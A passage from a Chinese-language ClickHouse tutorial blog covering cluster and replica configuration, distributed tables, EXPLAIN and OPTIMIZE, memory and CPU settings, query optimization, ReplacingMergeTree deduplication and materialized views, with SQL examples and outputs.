&lt;/perftest_1shards_3replicas&gt;&lt;/remote_servers&gt;&lt;zookeeper&gt;&lt;!-- 有几台服务器就需要几台zookeeper，按照以上需求，要写六台，这里省略 --&gt;    &lt;node&gt;        &lt;host&gt;zoo01.yandex.ru&lt;/host&gt;        &lt;port&gt;2181&lt;/port&gt;    &lt;/node&gt;    &lt;node&gt;        &lt;host&gt;zoo02.yandex.ru&lt;/host&gt;        &lt;port&gt;2181&lt;/port&gt;    &lt;/node&gt;    &lt;node&gt;        &lt;host&gt;zoo03.yandex.ru&lt;/host&gt;        &lt;port&gt;2181&lt;/port&gt;    &lt;/node&gt;&lt;/zookeeper&gt;&lt;macros&gt;    &lt;shard&gt;01&lt;/shard&gt;    &lt;replica&gt;rep_1_1&lt;/replica&gt;&lt;/macros&gt;</code></pre><p><font color="Red">macros用于建表时识别分片和副本，shard为分片名称，replica为副本名称，这个配置每台服务器上都要单独配置。</font></p><p>可以自定义配置，这里配置的含义是：<code>rep_&#123;a&#125;_&#123;b&#125;</code>，a表示分片编号，b表示副本编号。</p><pre><code class="xml">&lt;macros&gt;&lt;!-- 第1个分片，第1个副本 --&gt;    &lt;shard&gt;01&lt;/shard&gt;    &lt;replica&gt;rep_1_1&lt;/replica&gt;&lt;/macros&gt;&lt;macros&gt;&lt;!-- 第1个分片，第2个副本 --&gt;    &lt;shard&gt;01&lt;/shard&gt;    &lt;replica&gt;rep_1_2&lt;/replica&gt;&lt;/macros&gt;&lt;macros&gt;&lt;!-- 第2个分片，第1个副本 --&gt;    &lt;shard&gt;02&lt;/shard&gt;    &lt;replica&gt;rep_2_1&lt;/replica&gt;&lt;/macros&gt;&lt;macros&gt;&lt;!-- 第2个分片，第2个副本 --&gt;    &lt;shard&gt;02&lt;/shard&gt;    &lt;replica&gt;rep_2_2&lt;/replica&gt;&lt;/macros&gt;&lt;macros&gt;&lt;!-- 第3个分片，第1个副本 --&gt;    &lt;shard&gt;03&lt;/shard&gt;    &lt;replica&gt;rep_3_1&lt;/replica&gt;&lt;/macros&gt;&lt;macros&gt;&lt;!-- 第3个分片，第2个副本 --&gt;    &lt;shard&gt;03&lt;/shard&gt;    &lt;replica&gt;rep_3_2&lt;/replica&gt;&lt;/macros&gt;</code></pre><p><font color="Red">默认配置文件config.xml中官方也给我们配好了几个示例集群的配置，可以参考上面的配置以及配置说明。</font></p><pre><code class="sql">myubuntu1 :) show clusters;SHOW CLUSTERSQuery id: 1d87a0a9-9e49-498d-b097-c22a23530d2e┌─cluster──────────────────────────────────────┐│ test_cluster_two_shards                      ││ test_cluster_two_shards_internal_replication ││ test_cluster_two_shards_localhost            ││ test_shard_localhost                         ││ test_shard_localhost_secure                  ││ test_unavailable_shard                       │└──────────────────────────────────────────────┘</code></pre><h3 id="4、使用"><a href="#4、使用" class="headerlink" title="4、使用"></a>4、使用</h3><h4 id="（1）建表"><a href="#（1）建表" class="headerlink" title="（1）建表"></a>（1）建表</h4><p><strong>先建本地表：</strong></p><p>即创建之前说的worker，存储数据用的本地表。</p><pre><code class="sql">create table test_cluster_table on cluster test_shard_localhost(    id UInt8,    name String,    create_time Datetime default now())engine = ReplicatedMergeTree(&#39;clickhouse/tables/&#123;shard&#125;/test_cluster_table&#39;, &#39;&#123;replica&#125;&#39;)order by (id, name);Query id: 86b73340-2c9d-42a1-97e2-f99d8d388f0e┌─host────────────┬─port─┬─status─┬─error─┬─num_hosts_remaining─┬─num_hosts_active─┐│ 192.168.141.141 │ 9003 │      0 │       │                   0 │                0 │└─────────────────┴──────┴────────┴───────┴─────────────────────┴──────────────────┘1 rows in set. Elapsed: 0.111 sec.</code></pre><p>test_shard_localhost为集群名称</p><p>{shard}和{replica}都是配置文件中macros导入，不用自己填。</p><p><strong>再创建分布式表：</strong></p><p>即创建之前说的master</p><pre><code class="sql">create table test_cluster_table_all on cluster test_shard_localhost(    id UInt8,    name String,    create_time Datetime default now())engine=Distributed(test_shard_localhost, default, test_cluster_table, hiveHash(id));Query id: 69a6f496-e916-47ac-ae0b-636c9244bc90┌─host────────────┬─port─┬─status─┬─error─┬─num_hosts_remaining─┬─num_hosts_active─┐│ 192.168.141.141 │ 9003 │      0 │       │                   0 │                0 │└─────────────────┴──────┴────────┴───────┴─────────────────────┴──────────────────┘1 rows in set. Elapsed: 0.114 sec.</code></pre><p>test_shard_localhost为集群名称</p><p>default为数据库名</p><p>test_cluster_table为刚才创建的本地表名</p><p>hiveHash(id)，hiveHash表示采用什么算法分片，id表示用哪个字段分片。</p><h4 id="（2）使用"><a href="#（2）使用" class="headerlink" title="（2）使用"></a>（2）使用</h4><p>分布式表不存储数据，为每个本地表的逻辑汇总表。</p><pre><code class="sql">-- 从分布式表插入数据，本地表可以看到insert into test_cluster_table_all values(1, &#39;小明&#39;, now());select * from test_cluster_table;-- 从本地表插入，从分布式表也可以看得到insert into test_cluster_table values(2, &#39;小红&#39;, now());select * from test_cluster_table_all;</code></pre><p>本地表只能看到本服务器上存储的数据分片，无法看到其他服务器上存储的数据分片，而分布式表可以看到所有数据。</p><p>因此一般不用将本地表暴露给用户写入，统一从分布式表做增删改查。</p><h2 id="八、进阶语法"><a href="#八、进阶语法" class="headerlink" title="八、进阶语法"></a>八、进阶语法</h2><h3 id="1、explain"><a href="#1、explain" class="headerlink" title="1、explain"></a>1、explain</h3><p>20.6.3.28及以后版本才有explain功能。</p><p>官方文档：<a href="https://clickhouse.com/docs/en/sql-reference/statements/explain/">EXPLAIN | ClickHouse Documentation</a></p><pre><code class="sql">EXPLAIN [AST | SYNTAX | PLAN | PIPELINE] [setting = value, ...] SELECT ... [FORMAT ...]</code></pre><p>EXPLAIN SYNTAX …可以看到系统给你优化后的语法。</p><p>比如上面那个join的sql，通过系统优化后的sql语句如下。</p><pre><code class="sql">explain syntax select test2.id, sum(test3.money) from test3, test2 where test2.id = test3.id group by test2.id;┌─explain─────────────────────┐│ SELECT                      ││     id,                     ││     sum(test3.money)        ││ FROM test2                  ││ ALL INNER JOIN              ││ (                           ││     SELECT                  ││         id,                 ││         money               ││     FROM test3              ││ ) AS test3 ON id = test3.id ││ WHERE id = test3.id         ││ GROUP BY id                 │└─────────────────────────────┘</code></pre><p>但这里优化后的结果不对，是因为id没有加上test2表名，并且where条件也是多余的，手动修改为如下sql，对比原始sql执行速度，优化后的sql性能确实提升了一些。</p><p><font color="Red">千万不要盲目相信explain syntax后的结果，可能会让你得不偿失。</font></p><pre><code class="sql">SELECT    test2.id,    sum(test3.money)FROM test2ALL INNER JOIN(    SELECT        id,        money    FROM test3) AS test3 ON test2.id = test3.idGROUP BY test2.id;</code></pre><p>老版本没有explain语法，要查看执行计划，可以在进入客户端时，加上<code>--send_logs_level=trade &lt;&lt;&lt; &quot;sql&quot;</code>，然后去看日志即可。</p><h3 id="2、optimize"><a href="#2、optimize" class="headerlink" title="2、optimize"></a>2、optimize</h3><pre><code class="sql">OPTIMIZE TABLE [db.]name [ON CLUSTER cluster] [PARTITION partition | PARTITION ID &#39;partition_id&#39;] [FINAL] [DEDUPLICATE [BY expression]]</code></pre><p>optimize功能是触发一个表数据的合并。只能用于MergeTree系列表引擎、Buffer表引擎和MaterializedView表引擎。</p><p>触发数据合并的意思是，例如在一个ReplacingMergeTree表执行，则会执行一个任务，按order by指定的字段去重；又例如在SummingMergeTree表执行，则会执行一个任务，按照order by指定字段进行聚合，对SummingMergeTree指定字段进行sum计算，其他字段保留最新数据。<font color="Red">即将数据初始化，或重新整理分区数据。</font></p><p>如果指定了<code>FINAL</code>，则会强制执行数据合并，即使所有数据都在一个分区，或者已经有并发的合并正在进行。</p><h2 id="九、常用配置"><a href="#九、常用配置" class="headerlink" title="九、常用配置"></a>九、常用配置</h2><h3 id="1、CPU"><a href="#1、CPU" class="headerlink" title="1、CPU"></a>1、CPU</h3><table><thead><tr><th>位置</th><th>配置</th><th>说明</th></tr></thead><tbody><tr><td>user.xml</td><td>background_pool_size</td><td>表引擎相关的后台线程池大小，常用于merge任务。默认值为16，允许的情况下可以调整称服务器的逻辑线程数据。</td></tr><tr><td>user.xml</td><td>background_schedule_pool_size</td><td>后台任务线程池大小，常用于副本数据备份、kafka流、DNS缓存更新。默认值128。</td></tr><tr><td>user.xml</td><td>background_distributed_schedule_pool_size</td><td>后台任务线程池大小，常用于分布式数据发送。默认值为16。</td></tr><tr><td>config.xml</td><td>max_concurrent_queries</td><td>最大并发请求数，默认设置为100，建议不超过300。</td></tr><tr><td>user.xml</td><td>max_threads</td><td>单个查询使用的最大线程数，默认值为cpu物理核心数。这个值越低，查询时占用的内存越低。</td></tr></tbody></table><h3 id="2、内存"><a href="#2、内存" class="headerlink" title="2、内存"></a>2、内存</h3><table><thead><tr><th>位置</th><th>配置</th><th>说明</th></tr></thead><tbody><tr><td>user.xml</td><td>max_memory_usage</td><td>单次查询使用的最大内存。默认值为10G左右。</td></tr><tr><td>user.xml</td><td>max_bytes_before_external_groupby</td><td>当使用groupby时内存占用超过最大内存时，将数据写入磁盘做缓存进行groupby时大小。一般可以设置为max_memory_usage的一半。</td></tr><tr><td>user.xml</td><td>max_bytes_before_external_sort</td><td>当使用sort时内存占用超过最大内存时，将数据写入磁盘作为临时缓存进行sort时的大小。一般可以设置为max_memory_usage的一半。</td></tr><tr><td>config.xml</td><td>max_table_size_to_drop</td><td>drop table时，允许删除的表的最大大小，表大小超过这个值时删除表不被允许。设置为0时，认为没有限制。</td></tr></tbody></table><h2 id="十、查询优化"><a href="#十、查询优化" class="headerlink" title="十、查询优化"></a>十、查询优化</h2><h3 id="1、单表优化"><a href="#1、单表优化" class="headerlink" title="1、单表优化"></a>1、单表优化</h3><h4 id="（1）prewhere"><a href="#（1）prewhere" class="headerlink" title="（1）prewhere"></a>（1）prewhere</h4><p>只能用于MergeTree系列表引擎。</p><p>prewhere执行时，会直接扫描过滤条件中的列，将数据过滤后，再将需要的字段补全。</p><p>当查询列明显多于过滤列时，可以使用prewhere，降低IO。</p><p><code>optimize_move_to_prewhere</code>参数是在有需要的时候自动将where优化成prewhere，默认是打开的。即这个参数打开时，不需要手动写prewhere，系统会在有需要的时候自动优化成prewhere去查询。</p><p>部分情况下，不会自动优化成prewhere：</p><ul><li>使用常用表达式</li><li>使用默认值的alias类型的字段</li><li>包含了arrayJOIN，globalIn，globalNotIn，indexHint的查询</li><li>select字段和where字段相同</li><li>使用了主键字段</li></ul><p><font color="Red">有需要时，还是自己手动使用prewhere好，别太依赖系统的优化。</font></p><h4 id="（2）sample"><a href="#（2）sample" class="headerlink" title="（2）sample"></a>（2）sample</h4><p>只能用于MergeTree系列表引擎。</p><p>采样。不会对所有数据执行查询，而是对特定部分数据（样本）进行查询。</p><p>且这个样本并不是严格精确的数据量。</p><pre><code class="sql">-- 约10%样本查询select *from testsample 0.1;-- 当比例值远大于1时，这个含义便会转换为数据条数据，如这里采样至少10000条select *from testsample 10000;-- 加上offset表示跳过前面部分数据select *from testsample 0.1 offset 0.5</code></pre><p>和limit的区别在于，limit是严格精确的数据量，而sample并不是严格的数据量。同时sample可以用在where、group和orderby前面。</p><pre><code class="sql">SELECT    Title,    count() * 10 AS PageViewsFROM hits_distributedSAMPLE 0.1WHERE    CounterID = 34GROUP BY TitleORDER BY PageViews DESC LIMIT 1000;</code></pre><p>在一些特殊情况下，可以使用sample：</p><ul><li>业务需要查询延迟很低，但无法通过优化来降低延迟，且对具体结果的精确性不太讲究，可以使用近似结果</li><li>只想大致查看数据的分布以及数据质量</li></ul><h4 id="（3）orderby"><a href="#（3）orderby" class="headerlink" title="（3）orderby"></a>（3）orderby</h4><p>order by不要单独使用，结合where和limit一起使用。</p><p>一般排序后很少需要完整排序的结果，因此可以加一个limit。加limit和不加limit的效率还是有些差距的。</p><h4 id="（4）虚拟列"><a href="#（4）虚拟列" class="headerlink" title="（4）虚拟列"></a>（4）虚拟列</h4><p>clickhouse中<font color="Red">尽量不要使用虚拟列</font>，很消耗性能。可以在服务端或者其他地方处理数据，不要在clickhouse中使用虚拟列来处理数据。</p><pre><code class="sql">select a/b from test;select a, b from test;</code></pre><h3 id="2、多表关联"><a href="#2、多表关联" class="headerlink" title="2、多表关联"></a>2、多表关联</h3><p>数据集：</p><pre><code class="shell">curl -O https://datasets.clickhouse.com/hits/partitions/hits_v1.tartar xvf hits_v1.tar -C /var/lib/clickhouse # path to ClickHouse data directory# check permissions on unpacked data, fix if requiredcurl -O https://datasets.clickhouse.com/visits/partitions/visits_v1.tartar xvf visits_v1.tar -C /var/lib/clickhouse # path to ClickHouse data directory# check permissions on unpacked data, fix if requiredsudo service clickhouse-server restart</code></pre><p>clickhouse建表时没有like语法，因此使用以下语法创建一个张和hits_v1一样表结构的表。</p><pre><code class="sql">create table hits_testENGINE = MergeTreePARTITION BY toYYYYMM(EventDate)ORDER BY (CounterID, EventDate, intHash32(UserID))SAMPLE BY intHash32(UserID)SETTINGS index_granularity = 8192as select * from datasets.hits_v1 where 1 = 0;</code></pre><h4 id="（1）用in代替join"><a href="#（1）用in代替join" class="headerlink" title="（1）用in代替join"></a>（1）用in代替join</h4><p>但是in的使用场景很有限，而且使用时要特别注意查询结果，因为join是笛卡尔积，右表有重复数据的话，结果集可能不止一条，而使用in的话，右表有重复数据对于左表来说是没关系的。</p><h4 id="（2）大表在左，小表在右"><a href="#（2）大表在左，小表在右" class="headerlink" title="（2）大表在左，小表在右"></a>（2）大表在左，小表在右</h4><p>和MySQL或其他行式数据库不一样，clickhouse在使用join时，需要将大表作为主表，小表作为被关联的表。</p><pre><code class="sql">-- 内存不足，直接报错insert into hits_testselect a.* from datasets.visits_v1 b join datasets.hits_v1 a on a.CounterID = b.CounterID where a.CounterID &gt; 100000;-- 3.751秒，可以执行insert into hits_testselect a.* from datasets.hits_v1 a join datasets.visits_v1 b on a.CounterID = b.CounterID where a.CounterID &gt; 100000;</code></pre><h4 id="（3）先过滤再关联"><a href="#（3）先过滤再关联" class="headerlink" title="（3）先过滤再关联"></a>（3）先过滤再关联</h4><p>对于查询大数据量的sql，先过滤再关联，可以减少扫描的数据量，提升一点效率。即先对某一个表写where条件，形成一个子查询，再用子查询来关联，效率会比直接关联然后统一写where条件来的高。</p><p>使用先过滤再关联还有一个好处在于，如果过滤条件是右表，则可以减少将数据加载到内存的量。</p><pre><code class="sql">-- 1.999秒，效率低insert into hits_testselect a.* from datasets.hits_v1 a join datasets.visits_v1 b on a.CounterID = b.CounterID where a.EventDate = &#39;2014-03-17&#39;;-- 1.772秒，效率高insert into hits_testselect a.* from (select * from datasets.hits_v1 where EventDate = &#39;2014-03-17&#39;) a join datasets.visits_v1 b on a.CounterID = b.CounterID;-- 2.509秒，占用内存峰值1.91Ginsert into hits_testselect a.* from datasets.hits_v1 a join datasets.visits_v1 b on a.CounterID = b.CounterID where b.StartDate = &#39;2014-03-17&#39;;-- 2.478秒，占用内存峰值1.7Ginsert into hits_testselect a.* from datasets.hits_v1 a join (select CounterID from datasets.visits_v1 where StartDate = &#39;2014-03-17&#39;) b on a.CounterID = b.CounterID;</code></pre><h4 id="（4）分布式表用GLOBAL"><a href="#（4）分布式表用GLOBAL" class="headerlink" title="（4）分布式表用GLOBAL"></a>（4）分布式表用GLOBAL</h4><p>以3分片为例，hits_v1表为分布式表，visits_v1为普通表，以下查询为例。</p><pre><code class="sql">select * from (select * from hits_v1 perwhere CounterID &gt; 1000) a join visits_v1 b on on a.CounterID = b.CounterID;</code></pre><p>分布式表在join时，每台服务器都会将右表加载到各自服务器的内存中，然后进行匹配。不使用GLOBAL时，需要查3次右表；使用GLOBAL，可以只进行1次查询，并分发到其他节点。如果此时右表也是分布式表的话，不适用GLOBAL就会查9次；使用GLOBAL只需要查3次。这就是<code>查询放大</code>。</p><h4 id="（5）使用字典表"><a href="#（5）使用字典表" class="headerlink" title="（5）使用字典表"></a>（5）使用字典表</h4><p>Dictionary。</p><p><a href="https://clickhouse.com/docs/en/sql-reference/dictionaries/internal-dicts/">https://clickhouse.com/docs/en/sql-reference/dictionaries/internal-dicts/</a></p><h3 id="3、其他优化"><a href="#3、其他优化" class="headerlink" title="3、其他优化"></a>3、其他优化</h3><h4 id="（1）写入数据时先排序。"><a href="#（1）写入数据时先排序。" class="headerlink" title="（1）写入数据时先排序。"></a>（1）写入数据时先排序。</h4><p>因为写入数据时，数据不会直接分配到实际所在的那个分区，而是会先临时放在一个新的分区。无序的数据会产生大量的新分区，merge时会产生性能问题。</p><h4 id="（2）关注CPU"><a href="#（2）关注CPU" class="headerlink" title="（2）关注CPU"></a>（2）关注CPU</h4><p>cpu负载在50%时，会对查询性能会产生影响；cpu负载超过70%时，会出现大范围超时情况。因此不要以为在单次查询时性能很好就以为在实际生产环境中没有问题，放到生产环境中的查询sql要尽量优化好。</p><h2 id="十一、一致性"><a href="#十一、一致性" class="headerlink" title="十一、一致性"></a>十一、一致性</h2><p>clickhouse只能保证<font color="Red">最终一致性</font>！如ReplacingMergeTree的删除重复数据的功能，只会在进行数据合并时进行，即在不确定的时候后台进行。因此平时使用时，<font color="Red">不能保证没有重复数据</font>。问题：如何保证查询时数据的一致性。</p><pre><code class="sql">-- 创建表create table test_replacing_mt(    user_id UInt64,    score String,    deleted UInt8 default 0,    create_time DateTime default toDateTime(0))engine=ReplacingMergeTree(create_time)order by user_id;-- 写入数据insert into test_replacing_mt(user_id, score)with (    select [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;]) as dictselect number as user_id, dict[rand()%7+1] as scorefrom numbers(10000000);-- 修改数据（其实还是写入数据）insert into test_replacing_mt(user_id, score, create_time)with (    select [&#39;AA&#39;, &#39;BB&#39;, &#39;CC&#39;, &#39;DD&#39;, &#39;EE&#39;, &#39;FF&#39;, &#39;GG&#39;]) as dictselect number as user_id, dict[rand()%7+1] as score, now() as create_timefrom numbers(500000);-- 查询数据量，为10500000条，并没有立即去重select count(1) from test_replacing_mt;</code></pre><h3 id="1、手动optimize（错误）"><a href="#1、手动optimize（错误）" class="headerlink" title="1、手动optimize（错误）"></a>1、手动optimize（错误）</h3><p>每次执行完insert都手动进行optimize。</p><p>绝对不可取！！手动optimize只能空闲时间进行。</p><h3 id="2、手动通过sql实现"><a href="#2、手动通过sql实现" class="headerlink" title="2、手动通过sql实现"></a>2、手动通过sql实现</h3><p>通过设置一些特殊字段，如<code>deleted</code>控制该条数据是否被删除掉了，<code>create_time</code>控制该条数据的创建时间。</p><p>然后查询<code>create_time</code>为最新的，且<code>deleted</code>为0的数据，即可实现手动去重。</p><pre><code class="sql">select    user_id,    argMax(score, create_time) as score,    argMax(deleted, create_time) as deleted,    max(create_time) as ctimefrom test_replacing_mtgroup by user_idhaving deleted = 0</code></pre><p>以上面sql做一个普通视图，并在这个视图上查询数据，则可以查询到最新的有效数据。</p><pre><code class="sql">create view test_replacing_mt_view asselect    user_id,    argMax(score, create_time) as score,    argMax(deleted, create_time) as deleted,    max(create_time) as ctimefrom test_replacing_mtgroup by user_idhaving deleted = 0;-- 在视图上进行查询select count(1) from test_replacing_mt_view;select * from test_replacing_mt_view where user_id == 100;</code></pre><p>删除数据则通过插入一条<code>deleted = 0 and create_time = now()</code>的数据</p><pre><code class="sql">insert into test_replacing_mt values(100, &#39;AA&#39;, 1, now());-- 再次查询test_replacing_mt_view，发现没有数据返回select * from test_replacing_mt_view where user_id == 100;-- 9999999条数据select count(1) from test_replacing_mt_view;</code></pre><p>注：</p><ul><li>argMax(field1, field2)：按照field2的最大值取field1的值。</li></ul><h3 id="3、通过FINAL查询"><a href="#3、通过FINAL查询" class="headerlink" title="3、通过FINAL查询"></a>3、通过FINAL查询</h3><p>在sql语句中写final只支持ReplacingMergeTree和SummingMergeTree，因为这两个表引擎在合并数据时需要聚合，普通的MergeTree表引擎合merge时不需要聚合。</p><p>final的作用是根据order by指定的字段，查询版本号最新的一条数据。</p><p>20.5.2.7-stable版本之前是单线程进行，速度很慢，老版本不建议使用。后面新版本支持多线程，并且可以通过<code>max_final_threads</code>参数控制单个final查询的线程数。</p><pre><code class="sql">-- 当然deleted还是要加的select * from test_replacing_mt final where user_id = 100 and deleted = 0;-- 如果不加deleted字段，可以看到最新版本的数据是那条deleted为1的数据select * from test_replacing_mt final where user_id = 100;┌─user_id─┬─score─┬─deleted─┬─────────create_time─┐│     100 │ AA    │       1 │ 2021-12-11 13:27:54 │└─────────┴───────┴─────────┴─────────────────────┘</code></pre><h3 id="4、结论"><a href="#4、结论" class="headerlink" title="4、结论"></a>4、结论</h3><p>由于clickhouse对update和delete的操作不友善，因此在实际生产环境中最好加上这么几个字段：</p><p><code>create_time</code>：数据创建时间</p><p><code>deleted</code>：该数据是否被删除了，1代表是，0代表没有删除</p><p>或者使用</p><p><code>isvalid</code>：该条数据是否有效，1代表有效数据，0代表无效数据，即和<code>deleted</code>作用相反。</p><p>如果是新版本，则可以在使用final查询和自定义视图的方式之间权衡，对比两种方式的效率以及对数据库造成的压力，选择最适合的方式。注意并不一定是所有表都要用一种方式，可能有些数据使用自定义视图合适，而有些数据使用final合适。</p><p>如果是旧版本，final无法设置多线程，导致效率很低，则还是选择自定义视图的方式来实现吧。</p><p>其次，每天在空闲时间定时进行数据合并。</p><p>最后，如果以上方式效率都很低，但是某个业务对于查询出来的数据的准确定并不讲究，则可以不进行去重。</p><h2 id="十二、物化视图（MaterializedView）"><a href="#十二、物化视图（MaterializedView）" class="headerlink" title="十二、物化视图（MaterializedView）"></a>十二、物化视图（MaterializedView）</h2><p>普通视图只保存查询逻辑，并不保存数据。而物化视图会保存数据，即<font color="Red">真正创建一张隐藏表来存储数据</font>，当原始表数据插入数据时，新数据会按照物化视图的逻辑生成最新的数据。</p><p><strong>优点</strong>：快！当需要查询一些聚合的操作时，使用原始数据进行聚合查询可能会比较慢，但是可以通过物化视图将聚合数据加载到一张表中，然后直接查物化视图中的数据，速度就可想而知很快了。</p><pre><code class="sql">CREATE MATERIALIZED VIEW [IF NOT EXISTS] [db.]table_name [ON CLUSTER] [TO[db.]name] [ENGINE = engine] [POPULATE] AS SELECT ...</code></pre><ul><li><p>TO：隐藏表名，如果不加的话，默认为<code>.inner_id.xxxxxxxx</code></p></li><li><p>POPULATE：创建后会对数据进行初始化，即执行视图逻辑，并将所有数据写入隐藏表。生产环境不建议加，如果需要历史数据，可以手动insert。</p></li></ul><h3 id="1、使用"><a href="#1、使用" class="headerlink" title="1、使用"></a>1、使用</h3><pre><code class="sql">-- 创建原始数据表create table test_score(    user_id UInt64,    subject String,    score String,    isvalid UInt8 default 1,    create_time DateTime default toDateTime(0))engine=ReplacingMergeTree(create_time)order by (user_id, subject);-- 写入初始化数据insert into test_score(user_id, subject, score, create_time)with(    select range(1000)) as user_dict,(    select [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;]) as score_dict,(    select [&#39;语文&#39;, &#39;数学&#39;, &#39;英语&#39;]) as subject_dict,(    select [&#39;2021-12-11 15:00:00&#39;, &#39;2021-12-10 15:00:00&#39;, &#39;2021-12-09 15:00:00&#39;]) as ctime_dictselect    user_dict[rand()%1000+1] as user_id,    subject_dict[rand()%3+1] as subject,    score_dict[rand()%7+1] as score,    ctime_dict[rand()%3+1] as create_timefrom numbers(100000)order by user_id, subject;-- 创建物化视图，业务逻辑：将每个user_id的成绩记录成json格式，写入score_json字段create materialized view test_score_mvengine=ReplacingMergeTree(create_time)order by (user_id)as select user_id, score_json, isvalid, create_timefrom (    select        user_id,        &#39;&#123;&#39; || arrayStringConcat(groupArray(&#39;&quot;&#39; || subject || &#39;&quot;:&quot;&#39; || score || &#39;&quot;&#39;), &#39;,&#39;) || &#39;&#125;&#39; as score_json,        1 as isvalid,        max(ctime) as create_time    from (        select            user_id,            subject,            argMax(score, create_time) as score,            argMax(isvalid, create_time) as isvalid,            max(create_time) as ctime        from test_score        group by user_id, subject        having isvalid = 1    ) as tmp1    group by user_id) as tmp2;</code></pre><p>记录这个创建时间，初始化数据时可以通过筛选小于这个创建时间来初始化。</p><p>由于内存限制，初始化时，可以一批一批来</p><pre><code class="shell">clickhouse-client -m -h 192.168.141.141 --port 9003 --query &quot;select user_id from test_score group by user_id order by user_id format CSV;&quot; &gt; test_score.csvwhile read user_id; do echo &quot;$&#123;user_id&#125;&quot;; clickhouse-client -m -h 192.168.141.141 --port 9003 --query &quot;\insert into test_score_mv \select \    user_id, \    &#39;&#123;&#39; || arrayStringConcat(groupArray(&#39;\&quot;&#39; || subject || &#39;\&quot;:\&quot;&#39; || score || &#39;\&quot;&#39;), &#39;,&#39;) || &#39;&#125;&#39; as score_json, \    1 as isvalid, \    max(create_time) as create_time \from test_score \final \where user_id = $&#123;user_id&#125; \group by user_id \&quot;; done &lt; test_score.csv;</code></pre><p>测试插入新数据到<code>hits_test</code>：</p><pre><code class="sql">-- 测试插入前，可以查询历史数据是否成功插入到物化视图中select * from test_score_mv where user_id = 0 and subject = &#39;语文&#39;;┌─user_id─┬─score_json────────────────────────────┬─isvalid─┬─────────create_time─┐│       0 │ &#123;&quot;数学&quot;:&quot;EE&quot;,&quot;语文&quot;:&quot;EEE&quot;,&quot;英语&quot;:&quot;F&quot;&#125; │       1 │ 2021-12-11 17:54:16 │└─────────┴───────────────────────────────────────┴─────────┴─────────────────────┘-- 插入一条数据insert into test_score values (0, &#39;数学&#39;, &#39;EEE&#39;, 1, now());-- 再次查询物化视图，是有数据的，但是只有最新数据的group。select * from test_score_mv where user_id = 0 and subject = &#39;语文&#39;;┌─user_id─┬─score_json─────┬─isvalid─┬─────────create_time─┐│       0 │ &#123;&quot;数学&quot;:&quot;EEE&quot;&#125; │       1 │ 2021-12-11 18:31:53 │└─────────┴────────────────┴─────────┴─────────────────────┘┌─user_id─┬─score_json────────────────────────────┬─isvalid─┬─────────create_time─┐│       0 │ &#123;&quot;数学&quot;:&quot;EE&quot;,&quot;语文&quot;:&quot;EEE&quot;,&quot;英语&quot;:&quot;F&quot;&#125; │       1 │ 2021-12-11 17:54:16 │└─────────┴───────────────────────────────────────┴─────────┴─────────────────────┘</code></pre><p>测试更新数据（实际业务场景中不建议用update语句，这里只用作测试）。</p><pre><code class="sql">optimize table test_score;alter table test_score update score = &#39;AAA&#39; where user_id = 0;-- 发现物化视图数据并没有修改select * from test_score_mv where user_id = 0;┌─user_id─┬─score_json─────┬─isvalid─┬─────────create_time─┐│       0 │ &#123;&quot;数学&quot;:&quot;EEE&quot;&#125; │       1 │ 2021-12-11 18:31:53 │└─────────┴────────────────┴─────────┴─────────────────────┘┌─user_id─┬─score_json────────────────────────────┬─isvalid─┬─────────create_time─┐│       0 │ &#123;&quot;数学&quot;:&quot;EE&quot;,&quot;语文&quot;:&quot;EEE&quot;,&quot;英语&quot;:&quot;F&quot;&#125; │       1 │ 2021-12-11 17:54:16 │└─────────┴───────────────────────────────────────┴─────────┴─────────────────────┘</code></pre><p>测试删除数据（实际业务场景中不建议用update语句，这里只用作测试）。</p><pre><code class="sql">alter table test_score delete where user_id = 0;-- 发现物化视图数据同样没有修改select * from test_score_mv where user_id = 0;┌─user_id─┬─score_json─────┬─isvalid─┬─────────create_time─┐│       0 │ &#123;&quot;数学&quot;:&quot;EEE&quot;&#125; │       1 │ 2021-12-11 18:31:53 │└─────────┴────────────────┴─────────┴─────────────────────┘┌─user_id─┬─score_json────────────────────────────┬─isvalid─┬─────────create_time─┐│       0 │ &#123;&quot;数学&quot;:&quot;EE&quot;,&quot;语文&quot;:&quot;EEE&quot;,&quot;英语&quot;:&quot;F&quot;&#125; │       1 │ 2021-12-11 17:54:16 │└─────────┴───────────────────────────────────────┴─────────┴─────────────────────┘</code></pre><p><font color="Red">clickhouse的物化视图更像是触发器，且只对新增的部分数据有效，对历史数据，或update操作或delete操作都是无效的。物化视图功能有限，对于上面这种业务逻辑，是不适用的。</font></p><h3 id="2、简单聚合业务"><a href="#2、简单聚合业务" class="headerlink" title="2、简单聚合业务"></a>2、简单聚合业务</h3><p>简单聚合，如sum、max、min、count等业务，可以使用物化视图来实现。</p><p>物化视图使用的隐藏表不使用默认的，而是我们自己定义的表，具体如下：</p><p>业务介绍：统计每个设备出现的次数和最大值、最小值、平均值。</p><pre><code class="sql">-- 基础数据表CREATE TABLE counter (  when DateTime DEFAULT now(),  device UInt32,  value Float32) ENGINE=MergeTreePARTITION BY toYYYYMM(when)ORDER BY (device, when);-- 物化视图物理表，以天为单位做预聚合CREATE TABLE counter_daily (  day DateTime,  device UInt32,  count UInt64,  max_value_state AggregateFunction(max, Float32),  min_value_state AggregateFunction(min, Float32),  avg_value_state AggregateFunction(avg, Float32))ENGINE = SummingMergeTree()PARTITION BY tuple()ORDER BY (device, day);-- 物化视图CREATE MATERIALIZED VIEW counter_daily_mvTO counter_dailyAS SELECT    toStartOfDay(when) as day,    device,    count(*) as count,    maxState(value) AS max_value_state,    minState(value) AS min_value_state,    avgState(value) AS avg_value_stateFROM counterWHERE when &gt;= toDate(&#39;2019-01-01 00:00:00&#39;)GROUP BY device, dayORDER BY device, day;-- 查询SELECT  device,  sum(count) AS count,  maxMerge(max_value_state) AS max,  minMerge(min_value_state) AS min,  avgMerge(avg_value_state) AS avgFROM counter_daily_mvGROUP BY deviceORDER BY device ASC;</code></pre><p>物化视图的物理表使用的是SummingMergeTree表引擎，且定义三个状态函数。</p><p>物化视图则像一个触发器，将新插入的数据转换为以天为单位的状态写入物理表中。</p><p>最后查询时需要指定对应的聚合类型，获取对应的聚合值。</p><h3 id="3、应用场景"><a href="#3、应用场景" class="headerlink" 